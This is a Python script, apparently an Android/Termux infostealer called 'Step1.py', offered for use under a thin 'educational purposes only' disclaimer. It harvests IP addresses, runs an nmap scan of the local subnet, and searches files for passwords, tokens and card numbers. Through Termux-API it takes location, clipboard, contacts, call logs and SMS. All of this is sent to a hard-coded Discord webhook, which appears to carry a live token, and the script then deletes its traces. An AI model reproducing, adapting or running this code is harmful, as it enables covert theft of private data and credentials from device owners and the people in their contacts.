#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Step1.py – Advanced Data Exfiltration & Self‑Destruct (Termux‑optimised)
Uses threading to collect IP, scan network, harvest files, and exfiltrate via Discord.
FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
"""

import os
import sys
import json
import time
import re
import subprocess
import threading
import requests
from pathlib import Path
from datetime import datetime

# ============================================================
# CONFIG – REPLACE WITH YOUR WEBHOOK
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"
MAX_FILE_SIZE = 8 * 1024 * 1024  # Discord limit per file
# ============================================================

# Colors
R = '\033[31m'
G = '\033[1;32m'
O = '\033[33m'
B = '\033[34m'
C = '\033[36m'
W = '\033[0m'

# ============================================================
# HELPERS
# ============================================================

def send_to_discord(content, file_path=None):
    """Send message or file to Discord webhook."""
    try:
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= MAX_FILE_SIZE:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                r = requests.post(WEBHOOK_URL, files=files)
            return r.status_code in (200, 204)
        else:
            r = requests.post(WEBHOOK_URL, json={"content": content})
            return r.status_code in (200, 204)
    except Exception as e:
        print(f"{R}[!] Webhook error: {e}{W}")
        return False

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except:
        return "unknown"

def get_local_ip():
    """Get local IP using Termux-friendly methods."""
    # Try ifconfig first (may not be installed)
    try:
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part == "inet" and i+1 < len(parts):
                        ip = parts[i+1]
                        if ip.startswith(("192.168.", "10.", "172.")):
                            return ip
    except:
        pass

    # Fallback to 'ip addr'
    try:
        result = subprocess.run(["ip", "-4", "addr"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part == "inet" and i+1 < len(parts):
                        ip = parts[i+1].split('/')[0]
                        if ip.startswith(("192.168.", "10.", "172.")):
                            return ip
    except:
        pass
    return None

def is_vpn(ip):
    if not ip:
        return True
    vpn_ranges = ["192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
                  "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
                  "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
                  "100.64.", "127.", "0."]
    for prefix in vpn_ranges:
        if ip.startswith(prefix):
            return True
    return False

def ensure_nmap():
    """Install nmap if not present."""
    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
        return True
    except:
        print(f"{C}[*] nmap not found, installing...{W}")
        try:
            subprocess.run(["pkg", "install", "nmap", "-y"], capture_output=True, check=True)
            return True
        except:
            print(f"{R}[!] Failed to install nmap{W}")
            return False

# ============================================================
# THREAD 1: IP & NMAP SCAN
# ============================================================
def thread_ip_nmap():
    local = get_local_ip()
    public = get_public_ip()
    ip_info = f"Local: {local or 'N/A'}\nPublic: {public}"
    send_to_discord(f"📡 **IP Info**\n```\n{ip_info}\n```")

    if local and not is_vpn(local) and ensure_nmap():
        subnet = ".".join(local.split(".")[:3]) + ".0/24"
        print(f"{C}[*] Scanning subnet: {subnet}{W}")
        try:
            result = subprocess.run(["nmap", "-sn", subnet], capture_output=True, text=True, timeout=60)
            output_file = "nmap_scan.txt"
            with open(output_file, "w") as f:
                f.write(f"=== Nmap scan of {subnet} ===\n")
                f.write(result.stdout)
            send_to_discord("📡 **Nmap scan results**", output_file)
            os.remove(output_file)
        except Exception as e:
            print(f"{R}[!] Nmap error: {e}{W}")

# ============================================================
# THREAD 2: FILE SYSTEM HARVEST (Termux-friendly paths)
# ============================================================
def thread_file_harvest():
    results = []
    # Only scan accessible directories in Termux
    home = str(Path.home())
    storage = "/storage/emulated/0"
    sdcard = "/sdcard"
    targets = [home, storage, sdcard]
    # Filter out non-existent
    targets = [t for t in targets if os.path.exists(t)]

    extensions = [".txt", ".log", ".json", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".html", ".css", ".js", ".py", ".sh", ".bash", ".zsh", ".rc", ".env", ".properties"]
    important_keywords = ["password", "token", "api_key", "secret", "key", "pwd", "pass", "login", "username", "email", "credit", "card", "cvv", "ssn", "iban"]

    for base in targets:
        if not os.path.exists(base):
            continue
        # Limit depth to avoid long scans
        for root, dirs, files in os.walk(base, topdown=True, onerror=lambda e: None):
            depth = root.replace(base, "").count(os.sep)
            if depth > 4:
                continue
            for f in files:
                if any(f.endswith(ext) for ext in extensions):
                    path = os.path.join(root, f)
                    try:
                        size = os.path.getsize(path)
                        if size > 10 * 1024 * 1024:  # skip >10MB
                            continue
                        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                        for kw in important_keywords:
                            if kw in content.lower():
                                snippet = content[:500] + ("..." if len(content)>500 else "")
                                results.append({
                                    "file": path,
                                    "keyword": kw,
                                    "snippet": snippet,
                                    "size": size
                                })
                                break
                    except:
                        pass

    if results:
        with open("harvest.json", "w") as f:
            json.dump(results, f, indent=2)
        send_to_discord("📁 **File harvest results**", "harvest.json")
        os.remove("harvest.json")

# ============================================================
# THREAD 3: TERMUX-API DATA COLLECTION
# ============================================================
def thread_termux_api():
    api_data = {}
    commands = {
        "battery": ["termux-battery-status"],
        "location": ["termux-location"],
        "clipboard": ["termux-clipboard-get"],
        "call_log": ["termux-call-log"],
        "contacts": ["termux-contact-list"],
        "sms": ["termux-sms-list", "-l", "10"],
        "device_info": ["termux-telephony"],
        "wifi": ["termux-wifi-connectioninfo"],
        "sensors": ["termux-sensor", "-l"]
    }

    for key, cmd in commands.items():
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout.strip():
                try:
                    data = json.loads(result.stdout)
                    api_data[key] = data
                except:
                    api_data[key] = result.stdout.strip()
        except:
            pass

    if api_data:
        with open("api_data.json", "w") as f:
            json.dump(api_data, f, indent=2)
        send_to_discord("📱 **Termux-API data**", "api_data.json")
        os.remove("api_data.json")

# ============================================================
# SELF-DESTRUCT (safe for Termux)
# ============================================================
def self_destruct():
    """Delete temporary files and exit cleanly."""
    time.sleep(2)
    files = ["nmap_scan.txt", "harvest.json", "api_data.json"]
    for f in files:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass
    # Do NOT delete the script itself to avoid interfering with parent.
    sys.exit(0)

# ============================================================
# MAIN – RUN THREADS & SELF-DESTRUCT
# ============================================================
def main():
    print(f"\n{C}{'='*60}{W}")
    print(f"{C}Ω_BLACKSTAR – Step1.py (Termux edition) Initializing...{W}")
    print(f"{C}{'='*60}{W}\n")

    # Start threads
    t1 = threading.Thread(target=thread_ip_nmap, daemon=True)
    t2 = threading.Thread(target=thread_file_harvest, daemon=True)
    t3 = threading.Thread(target=thread_termux_api, daemon=True)

    t1.start()
    t2.start()
    t3.start()

    # Wait for threads (timeout to ensure they finish)
    t1.join(timeout=120)
    t2.join(timeout=180)
    t3.join(timeout=120)

    # Collect final IP for reporting (no blocking)
    public_ip = get_public_ip()
    if public_ip and public_ip != "unknown":
        send_to_discord(f"🌐 **Final public IP**: {public_ip}")

    send_to_discord("💀 **Self‑destruct sequence initiated**")
    self_destruct()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")
        sys.exit(1)
